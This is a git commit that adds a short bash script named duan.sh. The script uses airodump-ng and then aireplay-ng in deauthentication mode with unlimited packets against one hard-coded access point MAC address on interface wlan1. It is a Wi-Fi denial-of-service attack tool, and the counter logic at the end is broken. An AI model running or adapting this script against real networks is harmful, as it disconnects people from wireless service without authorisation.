0af8f3143fcff988d07ccacaa96d1ef3d90b4aad
zcvxcv <58098285@qq.com>
2018-06-09 16:02:13 +0000

    fitsi time

---
+++ duan.sh
@@ -0,0 +1,13 @@
+#!/bin/bash 
+check(){
+	ps -x |grep aireplay-ng | grep -v grep
+	if [ $? -ne 0 ];then
+		airodump-ng wlan1 & sleep 5;kill -9 $(ps -ef|grep airodump-ng|gawk '$0 !~/grep/ {print $2}' |tr -s '\n' ' ')
+		aireplay-ng wlan1 -0 0 -a D8:C8:E9:96:3F:30
+	fi
+	
+}
+	num=0
+ 	check
+	echo $num
+	num=num+1
